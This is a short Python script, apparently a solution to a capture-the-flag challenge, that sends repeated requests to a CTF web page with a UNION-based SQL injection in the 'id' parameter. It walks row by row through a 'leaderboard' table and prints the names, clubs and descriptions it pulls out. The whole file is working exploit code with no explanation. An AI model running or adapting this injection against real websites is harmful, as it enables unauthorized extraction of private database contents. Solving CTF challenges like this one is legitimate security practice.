import requests 
r = requests.session()
for i in range(100):
	print(i)
	tmp=r.get('http://golf-club.ch4.btsctf.pl/player.php?id=-13+union+select+1,2,3,4,5,6,7,concat_ws(0x3a,id,name,surname,club_name,r1,r2,player_description),9+from+leaderboard+limit+'+str(i)+',1--')
	print(tmp.text)
	# print(tmp.status_code)